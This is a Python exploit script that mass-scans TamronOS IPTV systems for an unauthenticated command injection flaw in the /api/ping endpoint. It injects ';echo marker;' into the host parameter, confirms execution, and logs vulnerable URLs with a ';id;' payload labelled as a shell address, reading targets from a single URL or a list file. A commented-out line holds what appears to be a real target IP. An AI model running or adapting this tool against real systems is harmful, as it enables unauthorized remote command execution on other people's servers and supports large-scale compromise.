import requests,json,sys,re
#url="http://111.224.101.26:8443"
def iptv(url):
    try:
        url1=url+"/api/ping?count=5&host=;echo xxwuud274642;"
        res=requests.get(url1,timeout=5)
        #print(res.text)
        a=json.loads(res.text)['result']
        if 'xxwuud274642' in a and 'echo' not in a:
            print("--------存在TamronOS IPTV系统存在前台命令执行漏洞---------")
            print(url+"/api/ping?count=5&host=;id;")
            with open('success.txt', 'a') as g:
                g.write(url + '\n' + "------------存在TamronOS IPTV系统存在前台命令执行漏洞---------------" + '\n' + "shell地址：" + '\n' + "执行id命令： " + url + "/api/ping?count=5&host=;id;" + '\n\n')
        else:
            print("不存在TamronOS IPTV系统存在前台命令执行漏洞")
    except Exception as e:
        print(e)
if '__main__'==__name__:
    if len(sys.argv) != 3:
        print("---------------------------------------------")
        print("python iptv.py -t url.txt")
        print("python iptv.py -u url")
        print("---------------------------------------------")
    else:
        z = sys.argv[1]
        r = sys.argv[2]
        if z=='-u':
            if 'http' not in r:
                r = 'http://' + r
            e = re.split('/', r)
            h = e[0] + '//' + e[1] + e[2]
            print(h)
            iptv(h)
        elif z=='-t':

            with open(r,'r') as f:
                p=f.readlines()
                for i in p:
                    d=re.sub('\n','',str(i))
                    #print(d)
                    if 'http' not in d:
                        d='http://'+d
                    e=re.split('/',d)
                    h=e[0]+'//'+e[1]+e[2]
                    print(h)
                    iptv(h)
        else:
            print("---------------------------------------------")
            print("python iptv.py -t url.txt")
            print("python iptv.py -u url")
            print("---------------------------------------------")